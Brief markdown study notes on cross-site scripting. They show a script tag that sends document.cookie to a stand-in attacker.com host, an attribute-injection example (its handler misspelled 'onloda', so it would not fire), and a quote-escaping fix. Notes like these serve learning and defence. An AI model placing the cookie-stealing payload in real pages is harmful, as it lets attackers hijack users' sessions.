# session hijacking with xss

```
<script type="text/javascript">
	new Image().src =
		'https://attacker.com/steal?cookie=' + document.cookie
</script>
```
# Dangerous HTML attributes

```
<img src='x.png' alt = 'DATA' />
```
- if you put *DATA= example' onloda='alert(document.cookie)*
this is result

```
<img src='x.png' alt = 'example' onloda='alert(document.cookie)' />
```
- how to fix???
- change *'* and *''* to &apos;, &quot;

